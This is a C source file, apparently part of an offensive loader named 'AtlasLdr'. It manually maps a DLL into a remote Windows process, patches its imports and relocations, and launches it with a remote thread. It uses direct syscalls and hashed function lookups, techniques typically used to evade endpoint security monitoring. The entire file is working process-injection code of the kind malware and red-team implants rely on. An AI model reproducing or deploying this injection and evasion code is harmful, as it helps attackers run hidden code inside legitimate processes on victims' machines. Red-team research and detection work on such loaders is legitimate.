#include <AtlasLdr.h>

void AtlasInject(PVOID pDllAddr, wchar_t* target, char* entryPoint){

    ATLAS_UTILS atlas_utils;
    TARGET_DATA target_data;

    RetrieveUtils(&atlas_utils);

    DWORD pid = FindTargetPid(target, &atlas_utils); 

    HANDLE hRemote = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (hRemote == INVALID_HANDLE_VALUE){
        ErrorCallback("Error getting remote handle", GetLastError(), 0, NULL, NULL, FALSE);
    }

    PVOID pExecutionAddr = AtlasLdr(pDllAddr, hRemote, entryPoint, &atlas_utils, &target_data);

    printf("%s - Executing remote thread\n", info);
    HANDLE hExecution = NULL;

    SysPrepare(atlas_utils.atlas_syscalls.NtCreateThreadExSSN, atlas_utils.atlas_syscalls.NtCreateThreadExAddr);
    NTSTATUS status = SysInvoke(&hExecution, GENERIC_EXECUTE, NULL, hRemote, (LPTHREAD_START_ROUTINE)pExecutionAddr, NULL, FALSE, NULL, NULL, NULL, NULL);
    if(!NT_SUCCESS(status)){
        ErrorCallback("Execution failed", 0, status, &atlas_utils, &target_data, TRUE);
    }

    CloseHandle(hExecution);
    CloseHandle(hRemote);

    printf("%s - Remote thread executed at %p\n", ok, pExecutionAddr);
}

PVOID AtlasLdr(PVOID pDllAddr, HANDLE hRemote, char* entryPoint, ATLAS_UTILS* atlas_utils, TARGET_DATA* target_data){

    DLL_DATA dll_data;
    PVOID pLocalMappingAddr = NULL;
    PVOID pTargetAddr = NULL;
    NTSTATUS status;

    RetrieveDLL_DATA(pDllAddr, &dll_data);
    
    SysPrepare(atlas_utils->atlas_syscalls.NtAllocateVirtualMemorySSN, atlas_utils->atlas_syscalls.NtAllocateVirtualMemoryAddr);
    status = SysInvoke(GetCurrentProcess(), &pLocalMappingAddr, 0, &dll_data.imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    if(!NT_SUCCESS(status)){
        ErrorCallback("Allocation failed", 0, status, NULL, NULL, FALSE);
    }

    SysPrepare(atlas_utils->atlas_syscalls.NtAllocateVirtualMemorySSN, atlas_utils->atlas_syscalls.NtAllocateVirtualMemoryAddr);
    status = SysInvoke(hRemote, &pTargetAddr, 0, &dll_data.imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(!NT_SUCCESS(status)){
        ErrorCallback("Allocation failed", 0, status, NULL, NULL, FALSE);
    }

    target_data->hRemote = hRemote;
    target_data->pTargetAddr = pTargetAddr;
    target_data->imageSize = dll_data.imageSize;

    

    printf("%s - Mapping sections\n", info);

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(dll_data.ntHeaders);
    dll_data.optHeader->ImageBase = (size_t)pTargetAddr;

    memcpy(
        pLocalMappingAddr, 
        dll_data.baseAddr, 
        dll_data.optHeader->SizeOfHeaders
    );

    for(size_t i = 0; i < dll_data.fileHeader->NumberOfSections; i++, sectionHeader++){
        memcpy(
            (PVOID)((DWORD_PTR)pLocalMappingAddr + sectionHeader->VirtualAddress),
            (PVOID)((DWORD_PTR)dll_data.baseAddr + sectionHeader->PointerToRawData),
            sectionHeader->SizeOfRawData
        );
    }
    printf("%s - Sections mapped\n\n", ok);


    printf("%s - Patching IAT\n", info);
    PatchIAT(pLocalMappingAddr, dll_data, atlas_utils, target_data);
    printf("%s - IAT patched\n\n", ok);

    printf("%s - Fixing relocations\n", info);
    FixRelocations(pTargetAddr, pLocalMappingAddr, dll_data);
    printf("%s - Relocations fixed\n\n", ok);

    status = atlas_utils->pNtWriteVirtualMemory(hRemote, pTargetAddr, pLocalMappingAddr, dll_data.imageSize, NULL);
    if(!NT_SUCCESS(status)){
        ErrorCallback("Write on target failed", GetLastError(), 0, atlas_utils, target_data, TRUE);
    }

    printf("%s - Changing memory protection\n", info);
    FixMemoryProtections(target_data, dll_data, atlas_utils);
    printf("%s - Memory protection changed\n\n", ok);

    if(entryPoint != NULL){
        dll_data.baseAddr = pLocalMappingAddr;
        size_t pExecutionAddr = C_GetProcAddress(dll_data, C_HashString(ConvertCharToWideChar(entryPoint)), NULL);
        if(pExecutionAddr != -1){
            return (PVOID)(pExecutionAddr + ((DWORD_PTR)pTargetAddr - (DWORD_PTR)pLocalMappingAddr));
        }
        else{
            ErrorCallback("Retrieve of the entrypoint failed", GetLastError(), 0, atlas_utils, target_data, TRUE);
        }
    }
    else{
        return (PVOID)((size_t)pTargetAddr + dll_data.entryPoint);
    }
}

